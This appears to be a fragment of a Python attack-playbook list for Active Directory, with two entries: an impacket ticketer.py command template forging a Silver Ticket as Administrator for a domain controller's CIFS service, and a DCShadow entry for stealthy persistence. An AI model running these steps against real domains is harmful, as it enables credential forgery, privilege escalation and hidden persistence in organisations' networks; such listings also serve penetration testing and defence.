                {"tool": "impacket-ticketer", "command": f"ticketer.py -nthash SERVICE_HASH -domain-sid DOMAIN_SID -domain {domain} -spn cifs/{dc_ip} Administrator", "purpose": "Silver Ticket for DC access"},
                {"tool": "dcshadow", "command": "Replicate malicious AD objects for stealthy persistence", "purpose": "DCShadow persistence"},
